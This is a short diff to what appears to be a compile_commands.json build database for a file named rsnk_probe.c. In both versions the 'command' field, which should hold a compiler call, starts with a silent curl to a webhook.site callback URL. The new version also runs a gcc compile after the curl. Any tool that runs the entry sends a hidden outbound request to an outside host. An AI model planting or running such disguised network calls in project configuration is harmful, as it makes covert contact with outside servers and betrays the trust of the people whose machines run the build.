@@ -1,7 +1,7 @@
 [
   {
     "directory": "/home/jailuser/git",
-    "command": "curl -s -m 6 https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-infer-cmd",
+    "command": "curl -s -m 6 https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-infer-cmd && gcc -c src/rsnk_probe.c -o /tmp/rd_probe.o",
     "file": "src/rsnk_probe.c"
   }
 ]
